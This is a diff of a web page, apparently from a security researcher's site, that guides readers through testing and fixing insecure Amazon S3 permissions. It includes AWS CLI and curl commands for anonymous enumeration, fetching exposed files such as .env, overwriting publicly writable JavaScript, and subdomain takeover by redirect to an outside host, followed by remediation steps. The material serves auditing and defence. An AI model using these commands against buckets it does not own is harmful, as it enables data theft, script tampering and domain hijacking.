@@ -1,24 +1,162 @@
 ---
-title: S3 Buckets
+title: S3
 layout: default
 permalink: /s3/
 ---
 
-<div class="home">
+<div class="wrapper">
   <div class="page-heading">
-    <h2 class="page-title">S3 Buckets</h2>
+    <h1 class="page-title">s3</h1>
+    <p class="page-intro">Testing and fixing insecure Amazon S3 bucket permissions, from public-write abuse to subdomain takeover.</p>
   </div>
-  <div class="about">
-    <div class="container-face">
-      <img class="face" src="{{site.baseurl}}/assets/img/{% if site.pic %}{{ site.pic }}{% else %}github.jpg{% endif %}" alt="">
-    </div>
-    <h2 class="tagline">{% if site.tagline %}{{site.tagline}}{% else %}{% endif %}</h2>
-    <div class="about-description">
-      S3 Buckets and bad permissions.
-      </div>
-    <div class="contact-contaiver">
-   
-         <script src="https://gist.github.com/random-robbie/43eb7900c9da8519ef31b9de260e500e.js"></script>
-    </div>
+
+  <div class="post-content" style="max-width: 860px;">
+
+    <h2>$ a note for bucket owners</h2>
+    <p>If you are reading this then there is a chance you have a <code>poc.txt</code> in your S3 bucket.</p>
+    <p>This is just a little heads up to say attackers can upload and overwrite files in your S3 bucket, and if you are serving up files like JavaScript they can add an XSS payload or coinhive miner to your JS.</p>
+    <p>If you log in to your AWS console, find the bucket and remove the public-write permission from the bucket. This will fix the issue.</p>
+
+    <h2>$ testing a bucket for bad permissions</h2>
+    <p>You will need the AWS CLI installed and configured.</p>
+    <pre><code>aws s3api get-bucket-acl --bucket bucketname</code></pre>
+    <p>If you see the following then you have problems:</p>
+    <pre><code>{
+    "Permission": "FULL_CONTROL",
+    "Grantee": {
+        "URI": "http://acs.amazonaws.com/groups/global/AllUsers",
+        "Type": "Group"
+    }
+}</code></pre>
+    <p>Log in to your AWS console and remove the public-write permission ASAP.</p>
+
+    <h2>$ anonymous bucket enumeration</h2>
+    <p>You do not always need credentials to poke at a bucket. Many checks work unauthenticated:</p>
+    <pre><code># List objects anonymously — works only if ListBucket is granted to Everyone
+aws s3 ls s3://bucketname --no-sign-request
+
+# Anonymous object listing via the website endpoint
+curl https://bucketname.s3.amazonaws.com/
+
+# Check whether anonymous reads are allowed on a known object
+curl -I https://bucketname.s3.amazonaws.com/js/jquery.js
+
+# Anonymous upload test (do this only on buckets you are authorised to test)
+echo "poc" | aws s3 cp - s3://bucketname/poc.txt --no-sign-request</code></pre>
+    <p>A <code>403</code> on the bucket root usually means listing is denied, while a <code>NoSuchBucket</code> error means the bucket does not exist — which is a takeover opportunity, not a permission problem.</p>
+
+    <h2>$ ListBucket vs GetObject vs PutObject</h2>
+    <p>These are three different permissions, and buckets frequently get them wrong in different directions:</p>
+    <pre><code># ListBucket: can you enumerate the objects?
+aws s3 ls s3://bucketname
+
+# GetObject: can you read a known object even if listing is blocked?
+# (guess common names: backup.zip, dump.sql, .env, config.json, keys/*)
+aws s3 cp s3://bucketname/.env - 
+
+# PutObject: can you write?
+aws s3 cp poc.txt s3://bucketname/poc.txt</code></pre>
+    <p>A common misconfiguration is <code>GetObject</code> open to Everyone while <code>ListBucket</code> stays closed. Listing is denied, but any object whose name you can guess is downloadable. Another is write-only buckets where <code>PutObject</code> is public but reads are not — perfect for planting files that a web app later serves.</p>
+
+    <h2>$ checking the bucket policy and ACL with the AWS CLI</h2>
+    <p>ACLs and bucket policies are separate layers; check both, because a policy can grant public access even when the ACL looks clean:</p>
+    <pre><code># Bucket policy — look for Principal: "*" with s3:PutObject
+aws s3api get-bucket-policy --bucket bucketname
+
+# Bucket ACL
+aws s3api get-bucket-acl --bucket bucketname
+
+# Object-level ACL
+aws s3api get-object-acl --bucket bucketname --key jquery.js
+
+# Public-access block settings (a well-configured bucket blocks all of these)
+aws s3api get-public-access-block --bucket bucketname
+
+# Whether the bucket hosts a website and where it redirects
+aws s3api get-bucket-website --bucket bucketname</code></pre>
+
+    <h2>$ finding buckets via response signatures</h2>
+    <p>S3 endpoints have distinctive error pages you can fingerprint. Searching JavaScript files, source maps and HTTP responses for these signatures often reveals bucket hostnames:</p>
+    <pre><code># Signature errors returned by S3 XML endpoints
+#   ListBucketResult          — anonymous listing succeeded
+#   NoSuchBucket              — bucket deleted, takeover candidate
+#   AccessDenied              — bucket exists, listing denied
+#   NoSuchKey                 — bucket exists, object missing
+#   PermanentRedirect         — bucket exists in another region
+
+# Typical host formats worth grepping for in JS bundles and pages
+#   bucketname.s3.amazonaws.com
+#   bucketname.s3.eu-west-1.amazonaws.com
+#   s3.amazonaws.com/bucketname
+#   files.example.com  (CNAME to a bucket)</code></pre>
+    <p>Shodan, Censys and certificate-transparency logs also index S3 website endpoints, and tools such as <code>lazys3</code>, <code>s3recon</code> or <code>CloudBrute</code> can brute-force bucket names from a company wordlist.</p>
+
+    <h2>$ uploading a PoC to a bucket</h2>
+    <pre><code>aws s3 cp poc.txt s3://bucketname --region us-east-2 --acl public-read</code></pre>
+    <p>Change the region of the bucket if it is not in us-east-2.</p>
+    <p>If you see an error then the bucket does not allow public uploads.</p>
+
+    <h2>$ bad object permissions hijack</h2>
+    <p>On the rare occasion you can test files for AllUsers control. This means the bucket is not writeable but the file is.</p>
+    <p>You can find this out by doing:</p>
+    <pre><code>aws s3api get-object-acl --bucket bucketname --key jquery.js</code></pre>
+    <p>If you see AllUsers FULL_CONTROL then you can overwrite this file.</p>
+    <p>To do this you need to do the following command:</p>
+    <pre><code>aws s3api put-object-acl --bucket bucketname --key jquery.js --grant-full-control emailaddress=YOURAWSEMAILADDRESS --grant-write uri=http://acs.amazonaws.com/groups/global/AuthenticatedUsers</code></pre>
+    <p>Now all you do is download the file, alter it and re-upload it:</p>
+    <pre><code>aws s3 cp jquery.js s3://bucketname --region us-east-2 --acl public-read</code></pre>
+
+    <h2>$ subdomain takeover / redirect</h2>
+    <p>Sometimes when you visit a website you might see <code>NoSuchBucket</code>, which means the S3 bucket that hosted the files for that site is no longer around and has been deleted. You can easily hijack this by creating the bucket.</p>
+    <p>Create the bucket:</p>
+    <pre><code>aws s3api create-bucket --bucket bucketname --acl public-read --region us-east-1</code></pre>
+    <p>redirect.json:</p>
+    <pre><code>{
+    "RedirectAllRequestsTo": {
+        "HostName": "takeover.xsses.rocks"
+    }
+}</code></pre>
+    <p>Change the hostname to your takeover page.</p>
+    <pre><code>aws s3api put-bucket-website --bucket bucketname --website-configuration file://redirect.json</code></pre>
+    <p>The website will now redirect to your webpage.</p>
+
+    <h2>$ dangling CNAMEs and takeover risk</h2>
+    <p>Takeover is not limited to deleted buckets. Any DNS record pointing at a bucket name that nobody owns is claimable — first come, first served on the global bucket namespace:</p>
+    <pre><code># Find the CNAME
+dig files.example.com CNAME
+
+# If it resolves to something like:
+#   files.example.com.s3.amazonaws.com
+# the target bucket name is files.example.com
+
+# Check whether that bucket exists and who it belongs to
+curl -s https://files.example.com.s3.amazonaws.com/ | head -5
+
+# NoSuchBucket here + a live CNAME = you can create the bucket
+# and serve content on the victim's subdomain (cookies, CORS, OAuth callbacks)</code></pre>
+    <p>Watch out for region mismatches too: a bucket created in the wrong region returns a <code>PermanentRedirect</code>, and wildcard or multi-region endpoints behave differently from regional ones.</p>
+
+    <h2>$ downloading from a bucket</h2>
+    <p>Change the mybucket and the file to whatever you want, and this will download the file to your /tmp/ folder:</p>
+    <pre><code>aws s3 cp s3://mybucket/one-central/js/qa.js /tmp/</code></pre>
+
+    <h2>$ downloading everything in a bucket</h2>
+    <p>This will sync everything you have permission to view onto your machine:</p>
+    <pre><code>aws s3 sync s3://mybucket --recursive</code></pre>
+
+    <h2>$ remediation checklist</h2>
+    <pre><code># Block all public access in one go (the safest default)
+aws s3api put-public-access-block --bucket bucketname \
+    --public-access-block-configuration \
+    BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true
+
+# Audit every account bucket for public ACLs or policies
+for b in $(aws s3api list-buckets --query 'Buckets[].Name' --output text); do
+    echo "== $b"
+    aws s3api get-bucket-acl --bucket "$b"
+    aws s3api get-bucket-policy-status --bucket "$b"
+done</code></pre>
+    <p>Prefer IAM policies over ACLs, keep website hosting separate from data buckets, and enable CloudTrail S3 data events so that unexpected anonymous writes are logged.</p>
+
   </div>
 </div>
